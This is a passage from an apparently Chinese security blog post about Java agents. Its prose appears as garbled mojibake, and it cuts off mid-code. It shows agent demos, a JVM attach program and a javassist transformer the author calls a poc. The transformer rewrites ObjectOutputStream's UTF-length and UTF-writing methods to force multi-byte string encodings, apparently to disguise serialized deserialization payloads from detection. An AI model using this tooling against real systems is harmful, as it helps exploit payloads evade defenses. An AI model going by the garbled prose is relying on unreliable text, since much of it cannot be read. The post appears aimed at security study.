<p>æ‰§è¡Œæ˜¯æˆåŠŸäº†ï¼Œç”Ÿæˆçš„ä¸œè¥¿çœ‹ç€ä¹Ÿæ²¡å•¥æ¯›ç—…ï¼Œä½†æ˜¯ååºåˆ—åŒ–çš„æ—¶å€™å‡ºé—®é¢˜äº†ï¼Œä½†æ˜¯æˆ‘ä¸æƒ³åˆ†æè¿™ä¸ªäº†ï¼Œè·Ÿæˆ‘æœ€åˆçš„æ€è·¯<code>èƒŒé“è€Œé©°</code>äº†</p>
<p>ä¼°è®¡æ˜¯è¿™ä¸ª<code>handles</code>çš„é—®é¢˜ï¼Œæˆ‘æŠŠè¿™ä¸ª<code>handles</code>ç¼–ç ç›¸å…³çš„éƒ½æ³¨é‡Šäº†ï¼Œä¸ç„¶è¿è¡Œä¸äº†ï¼Œå› ä¸ºä»–ä¹Ÿæ˜¯ä¸€ä¸ªå­ç±»çš„å€¼åé¢åˆå¾ˆéº»çƒ¦ï¼â€”â€”ï¼</p>
<p><img loading="lazy" src="../images/image-20241216173022063.png" alt="image-20241216173022063"  />
</p>
<p>çœ‹åˆ°<code>writeString</code>å½’æ ¹åˆ°åº•ï¼Œè¿˜æ˜¯è°ƒç”¨çš„<code>writeUTFBody</code>æ–¹æ³•ï¼Œé‚£æˆ‘éƒ½åˆ°ä¿®æ”¹java.ioä¸‹çš„åŒ…äº†ï¼Œä¸ºä»€ä¹ˆä¸ç›´æ¥ä¿®æ”¹<code>writeUTFBody</code>é‡Œçš„ä»£ç ä¸å°±è¡Œäº†ä¹ˆï¼Ÿï¼Ÿ</p>
<p><img loading="lazy" src="../images/image-20241216173205183.png" alt="image-20241216173205183"  />
</p>
<p>ä½†æ˜¯æˆ‘åˆæ‡’å¾—å†æ“ä½œä¸€ç¯‡äº†hhï¼Œå› ä¸ºæˆ‘çœ‹åˆ°äº†è¿™ç¯‡æ–‡ç«  <a href="https://xz.aliyun.com/t/14300?time__1311=GqAxuD9QiQDQ0%3DD%2F82cu7Dgm5qGQeeqKa4D#toc-1">ç”¨agentæ“ä½œ</a> ï¼Œæ€è·¯æ˜¯ä¸€æ ·å°±æ˜¯ä¿®æ”¹<code>writeUTFBody</code>çš„ä»£ç ï¼Œæ–‡ç« ä¸­æ˜¯æ³¨é‡Šäº†å…¶ä»–ifèŒƒå›´é™åˆ¶ï¼Œéƒ½ç”¨3byteçš„å½¢å¼ç”Ÿæˆutf-8ç¼–ç </p>
<h2 id="0x05-agent">0x05 agent<a hidden class="anchor" aria-hidden="true" href="#0x05-agent">#</a></h2>
<p>å½“ç„¶å•¦å¯¹äºä¸ä¼šagentçš„å°ä¼™ä¼´æ¥è¯´ï¼Œä¼šæœ‰ç‚¹å›°éš¾ï¼Œç¬”è€…è¿™é‡Œä¹Ÿä¸ä¼šä¸ç„¶ä¸è‡³äº<strong>ç»•é‚£ä¹ˆå¤šåœˆå­</strong>ï¼Œé‚£å°±åœ¨è¿™é‡Œ<strong>çªç ´æé™ï¼ï¼</strong></p>
<p>æ¨èä¸¤ç¯‡æ–‡ç« ï¼Œdemoæ„å»ºèµ·æ¥æŒºé¡ºåˆ©çš„ï¼Œä¹Ÿæœ‰ä¸ªå¤§æ¦‚çš„ç†è§£ï¼Œè¿™é‡Œä¸»è¦ç”¨æ¥ä¿®æ”¹å­—èŠ‚ç </p>
<ul>
<li>é€šè¿‡ <code>-javaagent</code> å‚æ•°æŒ‡å®š agent, ä»è€Œåœ¨ JVM å¯åŠ¨ä¹‹å‰ä¿®æ”¹ class å†…å®¹ (è‡ª JDK 1.5)</li>
<li>é€šè¿‡ <code>VirtualMachine.attach()</code> æ–¹æ³•, å°† agent é™„åŠ åœ¨å¯åŠ¨åçš„ JVM è¿›ç¨‹ä¸­, è¿›è€ŒåŠ¨æ€ä¿®æ”¹classå†…å®¹ï¼Œç„¶åé‡æ–°åŠ è½½è¿™ä¸ªclass (è‡ª JDK 1.6)</li>
</ul>
<p><a href="https://xz.aliyun.com/t/12626?time__1311=GqGxuD2DgAuDlrzY0%3DKqTa%3DeGQnox#toc-0">https://xz.aliyun.com/t/12626?time__1311=GqGxuD2DgAuDlrzY0%3DKqTa%3DeGQnox#toc-0</a></p>
<p><a href="https://exp10it.io/2023/01/java-agent-%E5%86%85%E5%AD%98%E9%A9%AC/#ide-%E9%85%8D%E7%BD%AE">https://exp10it.io/2023/01/java-agent-%E5%86%85%E5%AD%98%E9%A9%AC/#ide-%E9%85%8D%E7%BD%AE</a> //windowè·Ÿè¿™ç¯‡ç›´æ¥ideaæ„é€ çš„demo</p>
<p>è¿™é‡Œå°±ä¸å†å™è¿°äº†ï¼Œè®°å½•ä¸‹æ„å»ºdemoçš„ä¸€äº›ç»†èŠ‚çš„åœ°æ–¹</p>
<ol>
<li>ä¾èµ–å¯ä»¥ç›´æ¥ åœ¨åº“é‡Œé¢æ·»åŠ javaæ¥æ·»åŠ jar</li>
</ol>
<p><img loading="lazy" src="../images/image-20241217162908232.png" alt="image-20241217162908232"  />
</p>
<p>æˆ–è€…pom.xml</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>com.sun<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>tools<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>1.8.0<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;scope&gt;</span>system<span class="nt">&lt;/scope&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;systemPath&gt;</span>C:/MyFiles/Tools/ENV/JAVA/jdk1.8.0_74/lib/tools.jar<span class="nt">&lt;/systemPath&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span>
</span></span></code></pre></div><ol start="2">
<li>-javaagent</li>
</ol>
<p><img loading="lazy" src="../images/image-20241217161152627.png" alt="image-20241217161152627"  />
</p>
<p>è¿™é‡Œideaç‚¹å‡»<code>ä¿®æ”¹é€‰é¡¹</code>ï¼Œç„¶å<code>æ·»åŠ è™šæ‹Ÿæœºé€‰é¡¹</code>ï¼Œè¿™æ—¶ä¼šåœ¨testç±»ä¸Šæ–¹å¤šå‡ºä¸€è¡Œï¼Œè¿™ä¸ªåœ°æ–¹å¡«å…¥æˆ‘ä»¬çš„javaagent</p>
<ol start="3">
<li>
<blockquote>
<p>å…¶ä¸­å¸¦æœ‰ <code>Instrumentation inst</code> å‚æ•°çš„æ–¹æ³•ä¼˜å…ˆçº§æ›´é«˜, ä¼šä¼˜å…ˆè¢«è°ƒç”¨</p>
</blockquote>
<p>è¿™å¥è¯çš„ç†è§£ï¼Œæˆ‘å®éªŒçš„ç»“æœæ˜¯ï¼Œ<code>ä¸¤ä¸ªpremainéƒ½å­˜åœ¨</code>çš„æ—¶å€™<code>åª</code>æ‰§è¡Œäº†<code>inst</code>å‚æ•°çš„ï¼Œå½“<code>åªæœ‰argså‚æ•°çš„premain</code>çš„æ—¶å€™ä¼š<code>è¾“å‡º on inset</code></p>
</li>
</ol>
<p><img loading="lazy" src="../images/image-20241217161715785.png" alt="image-20241217161715785"  />
</p>
<h3 id="agentmain-æ–¹å¼">agentmain æ–¹å¼<a hidden class="anchor" aria-hidden="true" href="#agentmain-æ–¹å¼">#</a></h3>
<p>Demo</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.example</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.instrument.Instrumentation</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Demo</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">agentmain</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">args</span><span class="p">,</span><span class="w"> </span><span class="n">Instrumentation</span><span class="w"> </span><span class="n">inst</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;agentmain&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>MANIFEST.MF</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Manifest-Version: 1.0
</span></span><span class="line"><span class="cl">Agent-Class: com.example.Demo
</span></span></code></pre></div><p>ç„¶åæ‰“åŒ…æˆagent.jar</p>
<p>å¦ä¸€ä¸ªideaé¡¹ç›®ä¸‹</p>
<p>testç”¨äºæ¨¡æ‹Ÿä¸€ç›´è¿è¡Œçš„ç¨‹åº</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">test</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">InterruptedException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="kc">true</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;Hello World&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Thread</span><span class="p">.</span><span class="na">sleep</span><span class="p">(</span><span class="n">1000</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>jpsæ‰¾åˆ°<code>test</code>å¯¹åº”id</p>
<p><img loading="lazy" src="../images/image-20241217174850853.png" alt="image-20241217174850853"  />
</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.tools.attach.*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.List</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">agent_test</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">AgentLoadException</span><span class="p">,</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">AgentInitializationException</span><span class="p">,</span><span class="w"> </span><span class="n">AttachNotSupportedException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">VirtualMachine</span><span class="w"> </span><span class="n">attach</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">VirtualMachine</span><span class="p">.</span><span class="na">attach</span><span class="p">(</span><span class="s">&#34;21476&#34;</span><span class="p">);</span><span class="w">  </span><span class="c1">// å‘½ä»¤è¡Œæ‰¾åˆ°è¿™ä¸ªjvmçš„è¿›ç¨‹å·</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">attach</span><span class="p">.</span><span class="na">loadAgent</span><span class="p">(</span><span class="s">&#34;C:\\Users\\jie\\Desktop\\Java\\Learn\\out\\artifacts\\agent_jar\\agent.jar&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">attach</span><span class="p">.</span><span class="na">detach</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;attach ok&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list(); // å¾—åˆ° JVM è¿›ç¨‹åˆ—è¡¨</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        for (VirtualMachineDescriptor desc : list){ // éå†</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//            String name = desc.displayName(); // è¿›ç¨‹å</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//            String pid = desc.id(); // PID</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//            if (name.contains(&#34;test&#34;)){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                System.out.println(pid);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                VirtualMachine vm = VirtualMachine.attach(pid);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                vm.loadAgent(&#34;C:\\Users\\jie\\Desktop\\Java\\Learn\\out\\artifacts\\agent_jar\\agent.jar&#34;);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                vm.detach();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                System.out.println(&#34;attach ok&#34;);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                break;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//            }</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        }</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>ç„¶åè¿è¡Œ<code>agent_test</code>è¿›è¡Œ<code>attach</code>ï¼ŒæˆåŠŸæ‰§è¡Œ<code>agentmain()</code>ä¸­çš„ä»£ç </p>
<p><img loading="lazy" src="../images/image-20241217174941765.png" alt="image-20241217174941765"  />
</p>
<h3 id="å®æˆ˜">å®æˆ˜<a hidden class="anchor" aria-hidden="true" href="#å®æˆ˜">#</a></h3>
<p>æˆ‘ä»¬å­¦å®Œagentæ€ä¹ˆä¿®æ”¹classåè§£å†³è¿™ä¸ªé—®é¢˜è½»è€Œæ˜“ä¸¾ï¼</p>
<p>æˆ‘è¿™é‡Œæ˜¯ç”¨premainï¼Œç„¶åé€šè¿‡javaagentæ¥åŠ è½½æˆ‘ä»¬ç”Ÿæˆçš„jaråŒ…ï¼Œè¿™é‡Œç›´æ¥ä¸Šæˆ‘æœ€åçš„pocå§</p>
<p><code>JieTransformer</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.jie</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.instrument.ClassFileTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.instrument.IllegalClassFormatException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.security.ProtectionDomain</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">JieTransformer</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">ClassFileTransformer</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="n">ClassLoader</span><span class="w"> </span><span class="n">loader</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">className</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">classBeingRedefined</span><span class="p">,</span><span class="w"> </span><span class="n">ProtectionDomain</span><span class="w"> </span><span class="n">protectionDomain</span><span class="p">,</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">classfileBuffer</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IllegalClassFormatException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">//æ‹¦æˆªå³å°†è¢«åŠ è½½æˆ–é‡åŠ è½½çš„class</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="p">(</span><span class="n">className</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="s">&#34;java/io/ObjectOutputStream$BlockDataOutputStream&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;111111111111111&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">ClassPool</span><span class="w"> </span><span class="n">cp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ClassPool</span><span class="p">.</span><span class="na">getDefault</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">cp</span><span class="p">.</span><span class="na">importPackage</span><span class="p">(</span><span class="n">IOException</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getName</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                if (classBeingRedefined != null) {</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                    ClassClassPath ccp = new ClassClassPath(classBeingRedefined);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                    cp.insertClassPath(ccp);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                }</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">CtClass</span><span class="w"> </span><span class="n">ctc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cp</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">&#34;java.io.ObjectOutputStream$BlockDataOutputStream&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">CtMethod</span><span class="w"> </span><span class="n">method1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ctc</span><span class="p">.</span><span class="na">getDeclaredMethod</span><span class="p">(</span><span class="s">&#34;getUTFLength&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">CtClass</span><span class="o">[]</span><span class="p">{</span><span class="n">cp</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">&#34;java.lang.String&#34;</span><span class="p">)});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">ctc</span><span class="p">.</span><span class="na">removeMethod</span><span class="p">(</span><span class="n">method1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">CtMethod</span><span class="w"> </span><span class="n">make1</span><span class="o">=</span><span class="n">CtNewMethod</span><span class="p">.</span><span class="na">make</span><span class="p">(</span><span class="s">&#34;long getUTFLength(String s) {\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;            int len = s.length();\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;            long utflen = 0;\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;            for (int off = 0; off &lt; len; ) {\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;                int csize = Math.min(len - off, CHAR_BUF_SIZE);\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;                s.getChars(off, off + csize, cbuf, 0);\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;                for (int cpos = 0; cpos &lt; csize; cpos++) {\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;                    char c = cbuf[cpos];\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        &#34;                    if (c &gt;= 0x0001 &amp;&amp; c &lt;= 0x0020) {\n&#34; +</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        &#34;                        utflen++;\n&#34; +</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        &#34;                    } else if (c &gt; 0x07FF) {\n&#34; +</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        &#34;                        utflen += 3;\n&#34; +</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        &#34;                    } else {\n&#34; +</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;                        utflen += 2;\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        &#34;                    }\n&#34; +</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;                }\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;                off += csize;\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;            }\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;            return utflen;\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;        }&#34;</span><span class="p">,</span><span class="n">ctc</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">CtMethod</span><span class="w"> </span><span class="n">method2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ctc</span><span class="p">.</span><span class="na">getDeclaredMethod</span><span class="p">(</span><span class="s">&#34;writeUTFBody&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">CtClass</span><span class="o">[]</span><span class="p">{</span><span class="n">cp</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">&#34;java.lang.String&#34;</span><span class="p">)});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">ctc</span><span class="p">.</span><span class="na">removeMethod</span><span class="p">(</span><span class="n">method2</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">CtMethod</span><span class="w"> </span><span class="n">make2</span><span class="o">=</span><span class="n">CtMethod</span><span class="p">.</span><span class="na">make</span><span class="p">(</span><span class="s">&#34;private void writeUTFBody(String s) {\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;            int limit = MAX_BLOCK_SIZE - 3;\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;            int len = s.length();\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;            for (int off = 0; off &lt; len; ) {\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;                int csize = Math.min(len - off, CHAR_BUF_SIZE);\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;                s.getChars(off, off + csize, cbuf, 0);\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;                for (int cpos = 0; cpos &lt; csize; cpos++) {\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;                    char c = cbuf[cpos];\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;                    if (pos &lt;= limit) {\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        &#34;                        if (c &lt;= 0x0020 &amp;&amp; c != 0) {\n&#34; +</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        &#34;                            buf[pos++] = (byte) c;\n&#34; +</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        &#34;                        } else if (c &gt; 0x07FF) {\n&#34; +</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        &#34;                            buf[pos + 2] = (byte) (0x80 | ((c &gt;&gt; 0) &amp; 0x3F));\n&#34; +</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        &#34;                            buf[pos + 1] = (byte) (0x80 | ((c &gt;&gt; 6) &amp; 0x3F));\n&#34; +</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        &#34;                            buf[pos + 0] = (byte) (0xE0 | ((c &gt;&gt; 12) &amp; 0x0F));\n&#34; +</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        &#34;                            pos += 3;\n&#34; +</span><span class="w">
